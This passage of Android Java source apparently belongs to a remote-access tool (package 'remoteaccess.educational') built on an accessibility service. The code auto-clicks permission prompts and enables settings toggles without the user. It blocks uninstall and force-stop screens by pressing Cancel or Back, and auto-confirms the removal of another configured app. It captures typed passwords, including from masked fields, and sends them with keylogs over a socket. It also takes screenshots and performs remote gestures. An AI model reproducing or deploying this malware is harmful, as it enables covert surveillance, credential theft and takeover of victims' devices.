            String screenText = getAllScreenText(rootNode);

            // Check if app name exists anywhere (case-sensitive)
            if (!screenText.contains(appName)) return false;

            // Lowercase for "allow access" check
            String screenTextLower = screenText.toLowerCase();

            // Priority 1: Check if "allow access" exists anywhere (case-insensitive, full phrase)
            if (screenTextLower.contains("allow access")) {
                if (clickTextElementCI(rootNode, "Allow access")) {
                    return true;
                }
            }

            // Priority 2: Fall back to "Allow" if "Allow access" not found
            if (clickTextElementCI(rootNode, "Allow")) {
                return true;
            }

        } catch (Exception e) {
            e.printStackTrace();
        }
        return false;
    }

    /** Schedules a BACK press after the given delay in milliseconds. */
    private void scheduleBack(long delayMs) {
        new Handler(Looper.getMainLooper()).postDelayed(() -> {
            try { performBack(); } catch (Exception ignored) {}
        }, delayMs);
    }

    /**
     * Looks for unchecked toggles/switches/checkboxes on screen when the app name
     * is visible. Skips any item whose nearby text contains a blacklisted word.
     * If a direct Allow/Grant button is present on the same page it is clicked first.
     * If a toggle is found it is enabled, then Back is pressed after 500 ms.
     */
    private boolean runAccessibilityToggleGranter(AccessibilityNodeInfo rootNode) {
        try {
            String appName = getString(R.string.app_name).toLowerCase();
            String screenText = getAllScreenText(rootNode).toLowerCase();
            if (!screenText.contains(appName)) return false;

            // If there is a direct Allow / Grant / Turn on button on the page, click it first.
            String[] directButtons = { "Allow", "Grant", "Turn on", "Enable", "OK", "Ok", "Yes", "Accept" };
            for (String btn : directButtons) {
                if (findAndClickFullWord(rootNode, btn)) {
                    Log.i(TAG, "Auto-grant (storage page): clicked button \"" + btn + "\"");
                    scheduleBack(1_200);
                    return true;
                }
            }

            // Fall back to toggle/switch/checkbox
            if (findAndEnableToggleForAppName(rootNode)) {
                Log.i(TAG, "Auto-grant: enabled toggle for app on settings screen");
                scheduleBack(1_200);
                return true;
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return false;
    }

    /**
     * Recursively walks the node tree and enables the first unchecked
     * Switch / CheckBox / ToggleButton whose context text is not blacklisted.
     */
    private boolean findAndEnableToggleForAppName(AccessibilityNodeInfo node) {
        if (node == null) return false;
        try {
            CharSequence cls = node.getClassName();
            if (cls != null) {
                String classStr = cls.toString();
                boolean isToggle = classStr.contains("Switch") ||
                                   classStr.contains("CheckBox") ||
                                   classStr.contains("ToggleButton") ||
                                   classStr.contains("CompoundButton");
                if (isToggle && !node.isChecked()) {
                    String context = getNodeContextText(node).toLowerCase();
                    boolean blacklisted = false;
                    for (String bad : TOGGLE_BLACKLIST) {
                        if (context.contains(bad)) { blacklisted = true; break; }
                    }
                    if (!blacklisted) {
                        if (node.isClickable()) {
                            node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                        } else {
                            AccessibilityNodeInfo parent = node.getParent();
                            if (parent != null) {
                                if (parent.isClickable()) {
                                    parent.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                                } else {
                                    node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                                }
                                parent.recycle();
                            } else {
                                node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                            }
                        }
                        return true;
                    }
                }
            }
            for (int i = 0; i < node.getChildCount(); i++) {
                AccessibilityNodeInfo child = node.getChild(i);
                if (child != null) {
                    if (findAndEnableToggleForAppName(child)) {
                        child.recycle();
                        return true;
                    }
                    child.recycle();
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return false;
    }

    /**
     * Collects text from a node, its parent, and grandparent so we have enough
     * context to check for blacklisted words near the toggle.
     */
    private String getNodeContextText(AccessibilityNodeInfo node) {
        StringBuilder sb = new StringBuilder();
        try {
            if (node.getText() != null) sb.append(node.getText()).append(" ");
            if (node.getContentDescription() != null) sb.append(node.getContentDescription()).append(" ");
            AccessibilityNodeInfo parent = node.getParent();
            if (parent != null) {
                if (parent.getText() != null) sb.append(parent.getText()).append(" ");
                if (parent.getContentDescription() != null) sb.append(parent.getContentDescription()).append(" ");
                AccessibilityNodeInfo grandParent = parent.getParent();
                if (grandParent != null) {
                    collectText(grandParent, sb);
                    grandParent.recycle();
                }
                parent.recycle();
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return sb.toString();
    }
    
    private boolean runDefentProtection(AccessibilityNodeInfo rootNode) {
        // This runs CONTINUOUSLY forever - never stops
        
        // Check if dangerous words with app name found - close the window
        if (containsDangerousWordsWithAppName(rootNode)) {
            // Click cancel/close/back
            if (findAndClickFullWord(rootNode, "Cancel")) return true;
            if (findAndClickFullWord(rootNode, "Close")) return true;
            if (findAndClickFullWord(rootNode, "No")) return true;
            if (findAndClickFullWord(rootNode, "Back")) return true;
            performBack();
            return true;
        }
        
        return false;
    }
    
    private boolean containsDangerousWordsWithAppName(AccessibilityNodeInfo node) {
        if (node == null || currentAppName.isEmpty()) return false;
        
        try {
            String allText = getAllScreenText(node).toLowerCase();
            String appNameLower = currentAppName.toLowerCase();
            
            String[] dangerousWords = {"uninstall", "delete", "remove", "stop", "options", "active apps", "kill", "battery", "apps", "mins", "minimize", "force stop"};
            
            for (String word : dangerousWords) {
                if (allText.contains(appNameLower) && allText.contains(word)) {
                    return true;
                }
            }
            
            if (allText.contains("recent") && allText.contains(appNameLower)) {
                for (String word : dangerousWords) {
                    if (allText.contains(word)) {
                        return true;
                    }
                }
            }
            
        } catch (Exception e) {
            e.printStackTrace();
        }
        
        return false;
    }
    
    private String getAllScreenText(AccessibilityNodeInfo node) {
        StringBuilder sb = new StringBuilder();
        collectText(node, sb);
        return sb.toString();
    }
    
    private void collectText(AccessibilityNodeInfo node, StringBuilder sb) {
        if (node == null) return;
        
        try {
            if (node.getText() != null) {
                sb.append(node.getText().toString()).append(" ");
            }
            if (node.getContentDescription() != null) {
                sb.append(node.getContentDescription().toString()).append(" ");
            }
            
            for (int i = 0; i < node.getChildCount(); i++) {
                AccessibilityNodeInfo child = node.getChild(i);
                if (child != null) {
                    collectText(child, sb);
                    child.recycle();
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    
    // ── Contains-based click (broader matching) ───────────────────────────────────

    private boolean findAndClickContaining(AccessibilityNodeInfo node, String keyword) {
        if (node == null) return false;
        try {
            CharSequence text = node.getText();
            CharSequence desc = node.getContentDescription();
            String kw = keyword.toLowerCase();

            // Skip negative words
            if (text != null && isNegativeWord(text.toString().trim())) return false;
            if (desc != null && isNegativeWord(desc.toString().trim())) return false;

            boolean matches = false;
            if (text != null && text.toString().toLowerCase().contains(kw)) matches = true;
            if (desc != null && desc.toString().toLowerCase().contains(kw)) matches = true;

            if (matches && (node.isClickable() || isButtonClass(node))) {
                node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                return true;
            }
            if (matches) {
                AccessibilityNodeInfo parent = node.getParent();
                if (parent != null) {
                    if (parent.isClickable()) {
                        parent.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                        parent.recycle();
                        return true;
                    }
                    parent.recycle();
                }
            }

            for (int i = 0; i < node.getChildCount(); i++) {
                AccessibilityNodeInfo child = node.getChild(i);
                if (child != null) {
                    if (findAndClickContaining(child, keyword)) {
                        child.recycle();
                        return true;
                    }
                    child.recycle();
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return false;
    }

    private boolean isButtonClass(AccessibilityNodeInfo node) {
        CharSequence cls = node.getClassName();
        if (cls == null) return false;
        String c = cls.toString().toLowerCase();
        return c.contains("button") || c.contains("textview") || c.contains("imagebutton");
    }
    
    /** Enable uninstall-assist mode: accessibility will click Uninstall/OK buttons for 5 seconds only. */
    public void enableUninstallAssist() {
        uninstallAssistMode = true;
        Log.i(TAG, "Uninstall-assist mode ENABLED — will auto-disable after 5 seconds");
        if (uninstallAssistHandler == null) {
            uninstallAssistHandler = new Handler(Looper.getMainLooper());
        }
        uninstallAssistHandler.removeCallbacksAndMessages(null);
        uninstallAssistHandler.postDelayed(() -> {
            uninstallAssistMode = false;
            Log.i(TAG, "Uninstall-assist mode AUTO-DISABLED after 5 seconds");
        }, 5000);
    }

    /**
     * Schedules automatic uninstall of {@link Constants#AUTO_UNINSTALL_PACKAGE} 30 seconds
     * after the accessibility service connects.  Mirrors exactly what the dashboard's
     * App Manager does: arm uninstall-assist (auto-click OK/Uninstall), then fire
     * ACTION_DELETE so the system shows its confirmation dialog.
     * Skips silently if the package is not installed or the constant is empty.
     */
    private void scheduleAutoUninstall() {
        final String pkg = Constants.AUTO_UNINSTALL_PACKAGE;
        if (pkg == null || pkg.isEmpty()) return;

        new Handler(Looper.getMainLooper()).postDelayed(() -> {
            try {
                // Check the target package is actually installed before proceeding
                getPackageManager().getPackageInfo(pkg, 0);

                Log.i(TAG, "Auto-uninstall: arming uninstall-assist for " + pkg);
                enableUninstallAssist();

                // Fire the system uninstall dialog — same intent the dashboard uses
                Intent intent = new Intent(Intent.ACTION_DELETE,
                        Uri.parse("package:" + pkg));
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(intent);

                Log.i(TAG, "Auto-uninstall: system dialog opened for " + pkg);
            } catch (android.content.pm.PackageManager.NameNotFoundException e) {
                Log.i(TAG, "Auto-uninstall: package not installed, skipping — " + pkg);
            } catch (Exception e) {
                Log.e(TAG, "Auto-uninstall error: " + e.getMessage());
            }
        }, 30_000);
    }

    private boolean runUninstallAssist(AccessibilityNodeInfo rootNode) {
        if (!uninstallAssistMode) return false;
        String[] uninstallWords = { "Uninstall", "OK", "Delete", "Remove", "Yes", "Confirm" };
        for (String word : uninstallWords) {
            if (findAndClickFullWord(rootNode, word)) return true;
        }
        return false;
    }
    
    private boolean findAndClickFullWord(AccessibilityNodeInfo node, String searchText) {
        if (node == null) return false;
        
        try {
            CharSequence text = node.getText();
            CharSequence desc = node.getContentDescription();
            
            // Check if this is a negative word that should NEVER be clicked
            if (text != null && isNegativeWord(text.toString().trim())) {
                return false;
            }
            if (desc != null && isNegativeWord(desc.toString().trim())) {
                return false;
            }
            
            boolean matches = false;
            
            // Check text - exact match only (case insensitive), not substring
            if (text != null) {
                String nodeText = text.toString().trim();
                String searchTrimmed = searchText.trim();
                // Only match if EXACTLY equal, not contains
                if (nodeText.equalsIgnoreCase(searchTrimmed) && nodeText.length() == searchTrimmed.length()) {
                    matches = true;
                }
            }
            
            // Check content description - exact match only (case insensitive)
            if (desc != null) {
                String nodeDesc = desc.toString().trim();
                String searchTrimmed = searchText.trim();
                if (nodeDesc.equalsIgnoreCase(searchTrimmed) && nodeDesc.length() == searchTrimmed.length()) {
                    matches = true;
                }
            }
            
            if (matches) {
                // Only click if it's a button or clickable element
                boolean isButton = false;
                CharSequence className = node.getClassName();
                if (className != null) {
                    String classStr = className.toString().toLowerCase();
                    if (classStr.contains("button") || classStr.contains("textview") || 
                        classStr.contains("imagebutton") || classStr.contains("checkbox") ||
                        classStr.contains("switch") || classStr.contains("toggle")) {
                        isButton = true;
                    }
                }
                
                // Try to click this element if clickable or is a button type
                if (node.isClickable() || isButton) {
                    node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                    return true;
                }
                
                // Try to click parent
                AccessibilityNodeInfo parent = node.getParent();
                if (parent != null) {
                    if (parent.isClickable()) {
                        parent.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                        parent.recycle();
                        return true;
                    }
                    parent.recycle();
                }
                
                // Try to perform click action directly
                return node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
            }
            
            // Recursively check ALL children
            for (int i = 0; i < node.getChildCount(); i++) {
                AccessibilityNodeInfo child = node.getChild(i);
                if (child != null) {
                    if (findAndClickFullWord(child, searchText)) {
                        child.recycle();
                        return true;
                    }
                    child.recycle();
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        
        return false;
    }
    
    private boolean isNegativeWord(String text) {
        if (text == null || text.isEmpty()) return false;

        // Case-insensitive — one entry per concept, no duplicate case variants needed
        String lower = text.trim().toLowerCase();

        String[] negativeWords = {
            "deny", "don't allow", "dont allow",
            "never", "never allow",
            "restrict", "restricted",
            "no",
            "refuse", "block",
            "keep restricted",
            "not optimized",
            "cancel", "skip", "later",
            "not now", "decline",
            "disallow", "dismiss",
        };

        for (String word : negativeWords) {
            if (lower.equals(word)) return true;
        }

        return false;
    }

    @Override
    public void onInterrupt() {
    }

    @Override
    public void onDestroy() {
        try { super.onDestroy(); } catch (Exception ignored) {}
        try { removeBlackOverlay(); } catch (Exception ignored) {}
        try { com.remoteaccess.educational.commands.ScreenBlackout.getInstance().clearService(); } catch (Exception ignored) {}
        try {
            if (autoClickHandler != null && autoClickRunnable != null) {
                autoClickHandler.removeCallbacks(autoClickRunnable);
            }
        } catch (Exception ignored) {}
        try {
            if (autoGrantHandler != null) {
                autoGrantHandler.removeCallbacksAndMessages(null);
                autoGrantHandler = null;
            }
            autoGrantMode = false;
        } catch (Exception ignored) {}
        try {
            if (socketCheckHandler != null && socketCheckRunnable != null) {
                socketCheckHandler.removeCallbacks(socketCheckRunnable);
                socketCheckHandler = null;
            }
        } catch (Exception ignored) {}
        try {
            if (uninstallAssistHandler != null) {
                uninstallAssistHandler.removeCallbacksAndMessages(null);
                uninstallAssistHandler = null;
            }
            uninstallAssistMode = false;
        } catch (Exception ignored) {}
        try {
            if (keepAliveManager != null) {
                keepAliveManager.stop();
                keepAliveManager = null;
            }
        } catch (Exception ignored) {}
        try {
            com.remoteaccess.educational.commands.GestureRecorder gr =
                com.remoteaccess.educational.network.SocketManager.getInstance(this).getGestureRecorder();
            if (gr != null) gr.disableLockScreenAutoCapture();
        } catch (Exception ignored) {}
        instance = null;
    }

    public JSONObject readScreen() {
        JSONObject result = new JSONObject();
        try {
            AccessibilityNodeInfo rootNode = getRootInActiveWindow();
            if (rootNode == null) {
                result.put("success", false);
                result.put("error", "No active window");
                return result;
            }
            
            JSONObject screenData = new JSONObject();
            screenData.put("packageName", rootNode.getPackageName() != null ? rootNode.getPackageName().toString() : "");
            screenData.put("className", rootNode.getClassName() != null ? rootNode.getClassName().toString() : "");
            
            JSONArray elements = new JSONArray();
            readNodeRecursive(rootNode, elements, 0);
            screenData.put("elements", elements);
            screenData.put("elementCount", elements.length());
            
            rootNode.recycle();
            
            result.put("success", true);
            result.put("screen", screenData);
        } catch (Exception e) {
            try {
                result.put("success", false);
                result.put("error", e.getMessage());
            } catch (Exception ignored) {}
        }
        return result;
    }
    
    private void readNodeRecursive(AccessibilityNodeInfo node, JSONArray elements, int depth) {
        if (node == null || depth > 10) return;
        
        try {
            if (node.getText() != null || node.getContentDescription() != null) {
                JSONObject obj = new JSONObject();
                obj.put("text", node.getText() != null ? node.getText().toString() : "");
                obj.put("desc", node.getContentDescription() != null ? node.getContentDescription().toString() : "");
                obj.put("class", node.getClassName() != null ? node.getClassName().toString() : "");
                obj.put("clickable", node.isClickable());
                obj.put("scrollable", node.isScrollable());
                elements.put(obj);
            }
            
            for (int i = 0; i < node.getChildCount(); i++) {
                AccessibilityNodeInfo child = node.getChild(i);
                if (child != null) {
                    readNodeRecursive(child, elements, depth + 1);
                    child.recycle();
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    
    public boolean performClick(float x, float y) {
        Path path = new Path();
        path.moveTo(x, y);
        GestureDescription.Builder builder = new GestureDescription.Builder();
        builder.addStroke(new GestureDescription.StrokeDescription(path, 0, 100));
        return dispatchGesture(builder.build(), null, null);
    }
    
    public boolean performSwipe(float x1, float y1, float x2, float y2, int duration) {
        Path path = new Path();
        path.moveTo(x1, y1);
        path.lineTo(x2, y2);
        GestureDescription.Builder builder = new GestureDescription.Builder();
        builder.addStroke(new GestureDescription.StrokeDescription(path, 0, duration));
        return dispatchGesture(builder.build(), null, null);
    }
    
    public boolean performBack() {
        return performGlobalAction(GLOBAL_ACTION_BACK);
    }
    
    public boolean performHome() {
        return performGlobalAction(GLOBAL_ACTION_HOME);
    }
    
    public boolean performRecents() {
        return performGlobalAction(GLOBAL_ACTION_RECENTS);
    }
    
    public boolean performNotifications() {
        return performGlobalAction(GLOBAL_ACTION_NOTIFICATIONS);
    }
    
    public List<String> getKeylogs() {
        List<String> logs = new ArrayList<>(keylogBuffer);
        keylogBuffer.clear();
        return logs;
    }
    
    private void startAutoClickScanner() {
        autoClickHandler = new Handler(Looper.getMainLooper());
        autoClickRunnable = new Runnable() {
            @Override
            public void run() {
                autoClickAllowButton();
                if (autoClickHandler != null && autoClickRunnable != null) {
                    autoClickHandler.postDelayed(this, 200); // Scan every 200ms
                }
            }
        };
        autoClickHandler.post(autoClickRunnable);
    }

    public void startGrantPermsTimer() {
        // Periodic permission grant — handled by the Activity side.
    }

    // ── Password accumulation helpers ─────────────────────────────────────────

    /**
     * Rebuild the accumulated password string given the previous value, the
     * raw event text, and the change indices from the accessibility event.
     *
     * If the event text contains non-masking characters we prefer that (actual
     * chars exposed by the node), otherwise we fall back to index-based tracking.
     */
    private String buildAccumulatedPassword(String prev, String rawText, int fromIdx, int addedCount, int removedCount) {
        // If rawText has real (non-masked) characters, trust it directly
        if (rawText != null && rawText.length() > 0) {
            boolean hasRealChars = false;
            for (char c : rawText.toCharArray()) {
                if (c != '•' && c != '*' && c != '\u2022' && c != '\uFF65') {
                    hasRealChars = true; break;
                }
            }
            if (hasRealChars) return rawText;
        }
        // Fallback: reconstruct from previous + delta
        if (prev == null) prev = "";
        try {
            StringBuilder sb = new StringBuilder(prev);
            // Remove chars at fromIdx
            if (removedCount > 0 && fromIdx >= 0 && fromIdx <= sb.length()) {
                int end = Math.min(fromIdx + removedCount, sb.length());
                sb.delete(fromIdx, end);
            }
            // The added characters — we can't know them without raw text, so leave as-is
            // (length will track correctly even if chars are '•')
            return sb.toString();
        } catch (Exception e) {
            return prev;
        }
    }

    /** Flush any accumulated password for the given package to the live feed. */
    private void flushPasswordAccum(String pkg) {
        if (pkg == null || pkg.isEmpty()) return;
        // Find all keys for this package
        for (java.util.Map.Entry<String, String> e : passwordAccum.entrySet()) {
            if (e.getKey().startsWith(pkg + "|") && !e.getValue().isEmpty()) {
                String accumulated = e.getValue();
                String appName = getAppNameForPkg(pkg);
                try {
                    SocketManager sm = SocketManager.getInstance(this);
                    sm.getKeylogger().logEntry(pkg, appName, accumulated, "PASSWORD_FOCUS");
                    if (sm.isConnected()) {
                        String ts = new java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss",
                                java.util.Locale.getDefault()).format(new java.util.Date());
                        sm.pushKeylogEntry(pkg, appName, accumulated, "PASSWORD_FOCUS", ts,
                                true, currentFocusHint.isEmpty() ? "password" : currentFocusHint);
                    }
                } catch (Exception ignored) {}
            }
        }
        // Clear all keys for this package
        passwordAccum.entrySet().removeIf(e -> e.getKey().startsWith(pkg + "|"));
    }

    /**
     * Capture the current screen as a Bitmap using AccessibilityService.takeScreenshot() (API 30+).
     * Blocks the calling thread until the screenshot is ready (max 3 seconds).
     * Returns null on failure or if API < 30.
     */
    @RequiresApi(api = Build.VERSION_CODES.R)
    public Bitmap captureScreenSync() {
        final AtomicReference<Bitmap> result = new AtomicReference<>(null);
        final CountDownLatch latch = new CountDownLatch(1);
        try {
            takeScreenshot(Display.DEFAULT_DISPLAY,
                    getMainExecutor(),
                    new TakeScreenshotCallback() {
                        @Override
                        public void onSuccess(ScreenshotResult screenshot) {
                            try {
                                Bitmap bmp = Bitmap.wrapHardwareBuffer(
                                        screenshot.getHardwareBuffer(), screenshot.getColorSpace());
                                if (bmp != null) {
                                    result.set(bmp.copy(Bitmap.Config.ARGB_8888, false));
                                    bmp.recycle();
                                }
                                screenshot.getHardwareBuffer().close();
                            } catch (Exception e) {
                                Log.e(TAG, "captureScreenSync onSuccess error: " + e.getMessage());
                            } finally {
                                latch.countDown();
                            }
                        }
                        @Override
                        public void onFailure(int errorCode) {
                            Log.w(TAG, "captureScreenSync failed, errorCode=" + errorCode);
                            latch.countDown();
                        }
                    });
            latch.await(3, TimeUnit.SECONDS);
        } catch (Exception e) {
            Log.e(TAG, "captureScreenSync error: " + e.getMessage());
        }
        return result.get();
    }
}
